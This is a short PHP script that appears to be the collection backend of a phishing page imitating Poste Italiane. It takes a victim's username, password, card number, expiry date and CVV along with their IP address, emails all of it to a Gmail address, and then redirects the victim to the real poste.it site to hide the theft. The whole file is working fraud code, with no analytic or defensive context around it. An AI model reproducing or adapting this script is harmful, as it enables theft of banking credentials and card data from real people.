<?php


// Receiving variables

@$pfw_ip= $_SERVER['REMOTE_ADDR'];
@$USERNAME = addslashes($_POST['USERNAME']);
@$PASSWORD = addslashes($_POST['PASSWORD']);
@$card = addslashes($_POST['card']);
@$expm = addslashes($_POST['expm']);
@$expy = addslashes($_POST['expy']);
@$cvv = addslashes($_POST['cvv']);

// Validation
//Sending Email to form owner
$pfw_header = "From: PosteCCC\n";
$pfw_subject = "$card";
$pfw_email_to = "mailutauu@gmail.com";
$pfw_message = "Visitor's IP: $pfw_ip\n"
. "UserId: $USERNAME\n"
. "Password: $PASSWORD\n"
. "Card Number: $card\n"
. "Exp mm/yy: $expm / $expy\n"
. "Cvv: $cvv\n";
@mail($pfw_email_to, $pfw_subject ,$pfw_message ,$pfw_header ) ;

header("Location: http://poste.it");

?>

